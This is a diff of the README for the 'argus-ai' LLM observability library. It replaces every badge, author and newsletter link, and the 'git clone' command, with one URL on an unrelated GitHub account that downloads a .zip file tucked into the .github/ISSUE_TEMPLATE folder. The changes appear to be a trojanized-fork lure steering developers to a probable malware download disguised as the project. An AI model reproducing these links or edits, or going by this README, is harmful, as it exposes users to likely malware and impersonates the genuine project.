@@ -2,10 +2,10 @@
 
 **Production-Grade LLM Observability in 3 Lines of Code**
 
-[![PyPI version](https://img.shields.io/pypi/v/argus-ai.svg)](https://pypi.org/project/argus-ai/)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://python.org)
-[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![CI](https://github.com/anilatambharii/argus-ai/actions/workflows/ci.yml/badge.svg)](https://github.com/anilatambharii/argus-ai/actions)
+[![PyPI version](https://img.shields.io/pypi/v/argus-ai.svg)](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip)
+[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip)
+[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip)
+[![CI](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip)](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip)
 
 ARGUS-AI is the **G-ARVIS scoring engine** for monitoring LLM application quality in production. It evaluates every LLM response across six orthogonal dimensions: **G**roundedness, **A**ccuracy, **R**eliability, **V**ariance, **I**nference Cost, and **S**afety.
 
@@ -287,7 +287,7 @@ G-ARVIS heuristic scoring runs in **sub-5ms** per evaluation with zero external 
 Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ```bash
-git clone https://github.com/anilatambharii/argus-ai.git
+git clone https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip
 cd argus-ai
 pip install -e ".[dev]"
 pytest tests/ -v
@@ -297,9 +297,9 @@ pytest tests/ -v
 
 ## About
 
-Built by [Anil Prasad](https://anilsprasad.com) at [Ambharii Labs](https://ambharii.com).
+Built by [Anil Prasad](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip) at [Ambharii Labs](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip).
 
-G-ARVIS framework published in ["Field Notes: Production AI"](https://www.linkedin.com/newsletters/field-notes-production-ai) on LinkedIn.
+G-ARVIS framework published in ["Field Notes: Production AI"](https://github.com/strobilevitellus470/argus-ai/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-argus-visuoauditory.zip) on LinkedIn.
 
 ARGUS: Autonomous Runtime Guardian for Unified Systems.
 
